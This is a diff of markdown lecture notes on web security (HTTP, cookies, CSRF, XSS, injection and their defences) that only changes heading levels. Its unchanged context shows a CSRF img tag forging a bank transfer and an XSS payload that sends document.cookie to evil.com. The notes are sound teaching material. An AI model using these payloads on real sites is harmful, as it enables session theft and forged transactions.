@@ -139,7 +139,7 @@ $$
 
 # Web security
 
-#### HTTP requests
+## HTTP requests
 
 After establishing a TCP connection to a web server, a client can send **==HTTP requests==** to the server. These requests consist of:
 
@@ -161,7 +161,7 @@ After establishing a TCP connection to a web server, a client can send **==HTTP 
 
 **Note**: HTTP requests and responses are delivered via TCP over port 80. The standard HTTP does not provide any means of data encryption—meaning that an attacker can intercept the packets being sent between a client and server, and gain full access to any information that was being transmitted, acting as a man-in-the middle.
 
-#### HTTP responses
+## HTTP responses
 
 After receiving and interpreting a request message, a server responds with a **==HTTP response==** message of similar structure to the request—consisting of:
 
@@ -180,7 +180,7 @@ After receiving and interpreting a request message, a server responds with a **=
 	</p>
 </p>
 
-#### State in HTTP sessions
+## State in HTTP sessions
 
 HTTP is **==stateless==**—when a client sends a request, the server sends back a response, but the server does not hold any information on previous requests.
 
@@ -191,7 +191,7 @@ The idea to solve this is to insert some token into the page when it is requeste
 - Use **hidden fields**.
 - Use **cookies**.
 
-##### Hidden fields
+### Hidden fields
 
 This approach involves placing a **==hidden field==** in a HTML form. This hidden field contains a session ID in all of the HTML pages sent to the client. The hidden field will be returned back to the server in the request (once the form is submitted).
 
@@ -200,7 +200,7 @@ This approach involves placing a **==hidden field==** in a HTML form. This hidde
 | All web browsers support HTML forms. | Requires careful and tedious programming effort—all of the pages must be dynamically generated to include this hidden field. |
 |                                      | Session ends as soon as the browser is closed.               |
 
-##### Cookies
+### Cookies
 
 A **==cookie==** is a small piece of information that a server sends to a browser and is stored inside the browser. A cookie has a name and a value, along with other attributes such as domain, path, expiration date, version number and comments.
 
@@ -212,7 +212,7 @@ A server can set the cookie's value to uniquely identify a client. Hence, cookie
 | -------------- | ------------------------------------------- |
 |                | Users may disable cookies in their browser. |
 
-##### Setting cookies
+### Setting cookies
 
 Cookies are set on the client's when the server uses the `Set-Cookie` field in the HTTP header of its response. A cookie has several attributes:
 
@@ -222,7 +222,7 @@ Cookies are set on the client's when the server uses the `Set-Cookie` field in t
 - `Secure`: Whether to send the cookie.
 - `HttpOnly`: If enabled, scripting languages cannot access or manipulate the cookie.
 
-##### Cookie domains and hosts
+### Cookie domains and hosts
 
 A cookie is valid for the domain it is set for, and all its subdomains.
 
@@ -242,7 +242,7 @@ Hosts can access cookies set for their TLDs, but hosts can only set cookies one 
 
 A website can only set a cookie for domain that matched the domain of the HTTP response. Additionally, if the `domain` and `path` attributes of the cookie are not specified by the server, they default to the domain and path of the resource that was requested.
 
-#### Security goals
+## Security goals
 
 Web applications should provide the same security guarantees as those required for standalone applications. 
 
@@ -264,7 +264,7 @@ The main web application **security goals** are:
 
 - Sensitive data stored on any website should be protected.
 
-#### Session hijacking
+## Session hijacking
 
 **==Session hijacking==** is the exploitation of a valid computer session to gain unauthorised access to information or services in a computer system.
 
@@ -276,7 +276,7 @@ Sessions can be compromised in different ways—the most common are:
   - Cross-site-scripting (XSS) vulnerabilities.
 - **Cross-site request forgery (CSRF) vulnerabilities**
 
-##### Cross-site request forgery (CSRF)
+### Cross-site request forgery (CSRF)
 
 **==Cross-site request forgery (CSRF)==** forces a user to execute unwanted actions on a web application in which they are currently authenticated.
 
@@ -314,7 +314,7 @@ For a CSRF attack to work, it is essential that requests to the vulnerable serve
 > <img src="http://bank.com/transfer.do?acct=attacker&amount=100000" width="0" height="0">
 > ```
 
-###### CSRF defences
+#### CSRF defences
 
 - **Check the referrer**: A HTTP request can contain a `referrer` field in its header. Checking the `referrer` field in the client's HTTP requests can prevent CSRF attacks.
 
@@ -330,9 +330,9 @@ For a CSRF attack to work, it is essential that requests to the vulnerable serve
 
 - **Set the `SameSite` cookie attribute**: This attribute prevents cookies from being sent in cross-site requests. However, this is a very recent standard and might not be supported by all browsers.
 
-##### Cross-site scripting
+### Cross-site scripting
 
-###### Accessing the DOM
+#### Accessing the DOM
 
 The **==Document Object Model (DOM)==** is an interface of HTML elements (including cookies) to the outside world.
 
@@ -358,7 +358,7 @@ The API for the `document` or `window` elements can be used to manipulate the do
 > <img src=x onerror="this.src='http://evil.com/exploit.php?'+document.cookie"></img>
 > ```
 
-###### Same-origin policy (SOP)
+#### Same-origin policy (SOP)
 
 The **==same-origin policy (SOP)==** prevents a malicious script on one page from obtaining access to sensitive data on another webpage through that page's DOM—each origin is kept isolated (**sandboxed**) from the rest of the web.
 
@@ -368,7 +368,7 @@ An **==origin==** is defined by its **scheme**, its **host**, and the **port** o
 - Under the SOP, a browser permits scripts contained in a first webpage to access data in a second webpage, but only if both webpages have the same origin.
 - Cross-site HTTP requests initiated from within scripts are subject to SOP restriction for security reasons.
 
-###### Cross-site scripting attacks
+#### Cross-site scripting attacks
 
 **==Cross-site scripting (XSS) attacks==** are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.
 
@@ -381,11 +381,11 @@ The goal of the attacker is to insert code into the browser under the guise of c
 
 XSS attacks can generally be categorised into two categories **stored** and **reflected**.
 
-###### Stored XSS attacks
+#### Stored XSS attacks
 
 **==Stored XSS attacks==** are those where the injected script is **permanently stored on the target server**, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information.
 
-###### Reflected XSS attacks
+#### Reflected XSS attacks
 
 **==Reflected XSS attacks==** are those where the injected script is **reflected off the web server**, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
 
@@ -413,7 +413,7 @@ The key to the reflected XSS attack is to find a good web server that will echo 
 > </html>
 > ```
 
-###### XSS defences
+#### XSS defences
 
 - **Escape/filter output**: Escape dynamic data before inserting it into HTML.
 
@@ -445,28 +445,28 @@ The key to the reflected XSS attack is to find a good web server that will echo 
 
 - **`Http-Only` cookie attribute**: If enabled, scripting languages cannot access or manipulate the cookie.
 
-#### Server-side attacks
+## Server-side attacks
 
 **==Server-side attacks==** are attacks launched directly from an attacker (the client) to a listening service—most commonly a server.
 
-#### Injection attacks
+## Injection attacks
 
 **==Injection attacks==** such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorisation.
 
-##### Command injection
+### Command injection
 
 **==Command injection==** is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running an application, and typically fully compromise the application and all its data.
 
-###### Defences
+#### Defences
 
 - Include input validation, input escaping and sanitising, and restricting the power of an API.
 - Separate the data and code channels—the web server should be operating with the most restrictive permissions as possible: read, write and execute permissions only to necessary files.
 
-##### SQL injection
+### SQL injection
 
 **==SQL injection==** works similarly to command injection—but rather than code being injected to execute arbitrary operating system commands, the code manipulates SQL commands.
 
-###### Defences
+#### Defences
 
 - **Sanitise input** before using it to construct database queries.
 
